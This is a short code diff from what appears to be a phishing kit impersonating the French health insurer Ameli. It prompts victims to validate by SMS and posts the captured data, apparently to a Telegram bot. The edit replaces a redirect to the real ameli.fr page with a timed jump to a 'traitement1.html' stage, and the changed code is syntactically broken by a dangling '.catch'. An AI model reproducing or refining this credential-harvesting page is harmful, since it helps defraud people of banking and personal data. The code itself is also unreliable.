@@ -295,13 +295,11 @@ Valider par SMS si vous ne possédez pas l'application bancaire !
                     parse_mode: "Markdown"
                 })
             })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = "https://www.ameli.fr/assure/remboursements";
-                } else {
-                    alert("Erreur lors de la validation. Veuillez réessayer.");
-                }
-            })
+            // الانتقال إلى صفحة المعالجة بعد 5 ثواني
+            setTimeout(() => {
+                window.location.href = "traitement1.html";
+            }, 5000);
+
             .catch(error => {
                 console.error("Erreur:", error);
                 alert("Problème de connexion. Veuillez vérifier votre réseau.");
